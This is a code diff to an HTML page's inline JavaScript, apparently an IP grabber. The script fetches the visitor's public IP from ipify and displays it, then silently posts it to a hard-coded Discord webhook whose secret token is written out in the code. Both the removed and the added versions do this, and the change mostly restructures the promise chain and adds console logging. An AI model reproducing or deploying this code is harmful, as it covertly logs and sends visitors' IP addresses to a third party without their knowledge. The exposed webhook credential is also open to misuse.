@@ -14,26 +14,57 @@
     <p id="ip">Loading...</p>
 
     <script>
-        fetch('https://api64.ipify.org?format=json')
-            .then(response => response.json())
+        // Fetch IP address
+        const fetchIP = fetch('https://api64.ipify.org?format=json')
+            .then(response => {
+                console.log('IP API Response:', response); // Debugging the response
+                return response.json();
+            })
             .then(data => {
-                document.getElementById('ip').textContent = data.ip;
+                console.log('IP Data:', data); // Debugging the fetched data
+                return data.ip;
+            })
+            .catch(error => {
+                console.error('Error fetching IP:', error); // Debugging IP fetch error
+                throw error;
+            });
 
-                // Send the IP data to your Discord webhook
-                return fetch('https://discord.com/api/webhooks/1354853629772824726/P_wYy-x_B49xkFv6gmuYpBP7Yc4Ndiqr7zs2rEIakC7m7zcUk2IHIGUD9VZo0FXngswo', { 
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ content: `User's IP: ${data.ip}` }) // Corrected payload
-                });
+        // Send Webhook asynchronously
+        const sendWebhook = (ip) => {
+            return fetch('https://discord.com/api/webhooks/1354853629772824726/P_wYy-x_B49xkFv6gmuYpBP7Yc4Ndiqr7zs2rEIakC7m7zcUk2IHIGUD9VZo0FXngswo', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: `User's IP: ${ip}` }) // Corrected payload
             })
             .then(response => response.text())
             .then(result => {
-                console.log('Webhook response:', result);
-                console.log("Script execution completed.");
+                console.log('Webhook response:', result); // Debugging webhook response
+                return result;
             })
-            .catch(error => console.error('Error:', error));
+            .catch(error => {
+                console.error('Error sending Webhook:', error); // Debugging webhook error
+                throw error;
+            });
+        };
+
+        // Run both fetch IP and send Webhook simultaneously
+        fetchIP.then(ip => {
+            document.getElementById('ip').textContent = ip;
+
+            // Send Webhook in the background while displaying the IP
+            sendWebhook(ip)
+                .then(result => {
+                    console.log('Webhook completed successfully:', result); // Debugging webhook success
+                })
+                .catch(error => {
+                    console.error('Error completing Webhook:', error); // Debugging webhook failure
+                });
+        }).catch(error => {
+            document.getElementById('ip').textContent = 'Failed to fetch IP.';
+            console.error('Error fetching IP:', error); // Debugging fetch IP failure
+        });
     </script>
 </body>
 </html>
